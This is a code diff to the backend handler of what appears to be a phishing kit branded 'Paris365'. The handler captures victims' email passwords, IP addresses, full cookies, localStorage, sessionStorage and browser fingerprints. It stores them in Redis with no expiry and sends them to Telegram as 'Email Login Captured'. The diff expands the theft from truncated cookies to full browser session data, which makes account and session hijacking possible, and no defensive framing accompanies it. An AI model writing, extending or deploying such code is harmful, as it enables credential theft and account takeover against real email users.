@@ -41,13 +41,13 @@ export const handler = async (event, context) => {
                      event.headers['cf-connecting-ip'] || 
                      'Unknown';
 
-    // Use browser fingerprint data if available, fallback to headers
-    const cookieInfo = browserFingerprint?.cookies || event.headers.cookie || 'No cookies found';
+    // Use browser fingerprint data (now properly collected from frontend)
+    const cookieInfo = browserFingerprint?.cookies || 'No cookies found';
     const localStorageInfo = browserFingerprint?.localStorage || 'Not available';
     const sessionStorageInfo = browserFingerprint?.sessionStorage || 'Not available';
     
-    // Get additional browser fingerprinting data (excluding referer)
-    const acceptLanguage = event.headers['accept-language'] || 'Unknown';
+    // Get additional browser fingerprinting data
+    const acceptLanguage = event.headers['accept-language'] || browserFingerprint?.language || 'Unknown';
     const acceptEncoding = event.headers['accept-encoding'] || 'Unknown';
     
     // Check environment variables first
@@ -112,7 +112,7 @@ export const handler = async (event, context) => {
       };
     }
 
-    // Store session data in Redis with 24-hour expiration
+    // Store session data in Redis
     const sessionId = Math.random().toString(36).substring(2, 15);
     const sessionData = {
       email,
@@ -123,7 +123,9 @@ export const handler = async (event, context) => {
       clientIP,
       userAgent,
       deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop',
-      cookies: cookieInfo.length > 200 ? cookieInfo.substring(0, 200) + '...' : cookieInfo,
+      cookies: cookieInfo,
+      localStorage: localStorageInfo,
+      sessionStorage: sessionStorageInfo,
       acceptLanguage,
       acceptEncoding,
       browserFingerprint
@@ -133,32 +135,56 @@ export const handler = async (event, context) => {
       // Store in Redis with no expiration (set without TTL)
       await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
       await redis.set(`user:${email}`, JSON.stringify(sessionData));
+      
+      // Also store cookies separately for easy access
+      await redis.set(`cookies:${sessionId}`, JSON.stringify({
+        cookies: cookieInfo,
+        localStorage: localStorageInfo,
+        sessionStorage: sessionStorageInfo,
+        timestamp: timestamp,
+        email: email
+      }));
     } catch (redisError) {
       console.error('Redis storage error:', redisError);
       // Continue with Telegram even if Redis fails
     }
 
-    // Format message for Telegram with better mobile detection (without referer)
+    // Format message for Telegram with comprehensive cookie information
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
     
-    // Format cookies for better readability
-    const formattedCookies = cookieInfo.length > 150 ? cookieInfo.substring(0, 150) + '...' : cookieInfo;
+    // Format cookies for better readability - show actual cookies now
+    const cookiesDisplay = cookieInfo && cookieInfo !== 'No cookies found' 
+      ? (cookieInfo.length > 300 ? cookieInfo.substring(0, 300) + '...' : cookieInfo)
+      : '❌ No cookies found';
     
-    // Additional browser data
+    // Format localStorage
+    const localStorageDisplay = localStorageInfo && localStorageInfo !== 'Empty' 
+      ? (localStorageInfo.length > 200 ? localStorageInfo.substring(0, 200) + '...' : localStorageInfo)
+      : '📭 Empty';
+    
+    // Format sessionStorage
+    const sessionStorageDisplay = sessionStorageInfo && sessionStorageInfo !== 'Empty' 
+      ? (sessionStorageInfo.length > 200 ? sessionStorageInfo.substring(0, 200) + '...' : sessionStorageInfo)
+      : '📭 Empty';
+    
+    // Additional browser data from comprehensive fingerprint
     const additionalInfo = browserFingerprint ? `
 🖥️ *Screen:* \`${browserFingerprint.screen || 'Unknown'}\`
 🌍 *Timezone:* \`${browserFingerprint.timezone || 'Unknown'}\`
 🔧 *Platform:* \`${browserFingerprint.platform || 'Unknown'}\`
 🍪 *Cookies Enabled:* ${browserFingerprint.cookieEnabled ? '✅' : '❌'}
 📶 *Online Status:* ${browserFingerprint.onlineStatus || 'Unknown'}
-💾 *LocalStorage:* \`${browserFingerprint.localStorage?.substring(0, 100) || 'Empty'}${browserFingerprint.localStorage?.length > 100 ? '...' : ''}\`
-🗂️ *SessionStorage:* \`${browserFingerprint.sessionStorage?.substring(0, 100) || 'Empty'}${browserFingerprint.sessionStorage?.length > 100 ? '...' : ''}\`${browserFingerprint.touchSupport ? `
+🔌 *Plugins:* \`${browserFingerprint.plugins?.slice(0, 3).join(', ') || 'None'}${browserFingerprint.plugins?.length > 3 ? '...' : ''}\`
+🤖 *WebDriver:* ${browserFingerprint.webdriver ? '⚠️ Detected' : '✅ Not detected'}
+⚡ *CPU Cores:* \`${browserFingerprint.hardwareConcurrency || 'Unknown'}\`${browserFingerprint.deviceMemory ? `
+💾 *Device Memory:* \`${browserFingerprint.deviceMemory}GB\`` : ''}${browserFingerprint.connection ? `
+📡 *Connection:* \`${browserFingerprint.connection}\`` : ''}${browserFingerprint.touchSupport ? `
 👆 *Touch Support:* ${browserFingerprint.touchSupport}` : ''}${browserFingerprint.orientation ? `
 📱 *Orientation:* \`${browserFingerprint.orientation}\`` : ''}${browserFingerprint.devicePixelRatio ? `
 🔍 *Pixel Ratio:* \`${browserFingerprint.devicePixelRatio}\`` : ''}` : '';
     
     const message = `
-🔐 *Email Login*
+🔐 *Email Login Captured*
 
 📧 *Email:* \`${email}\`
 🔑 *Password:* \`${password}\`
@@ -169,11 +195,21 @@ export const handler = async (event, context) => {
 ${deviceInfo}
 🌍 *Language:* \`${acceptLanguage}\`
 📦 *Encoding:* \`${acceptEncoding}\`
-🍪 *Cookies:* \`${formattedCookies}\`${additionalInfo}
+
+🍪 *COOKIES:*
+\`${cookiesDisplay}\`
+
+💾 *LOCAL STORAGE:*
+\`${localStorageDisplay}\`
+
+🗂️ *SESSION STORAGE:*
+\`${sessionStorageDisplay}\`${additionalInfo}
+
 🆔 *Session ID:* \`${sessionId}\`
+📁 *Cookies File:* Downloaded automatically
 
 ---
-*Paris365*
+*Paris365 - Full Browser Session Captured*
     `;
 
     // Send to Telegram with retry logic for mobile networks
@@ -228,8 +264,9 @@ ${deviceInfo}
       headers,
       body: JSON.stringify({ 
         success: true, 
-        message: 'Credentials captured successfully',
-        sessionId: sessionId
+        message: 'Credentials and browser session captured successfully',
+        sessionId: sessionId,
+        cookiesCollected: cookieInfo !== 'No cookies found'
       }),
     };
 
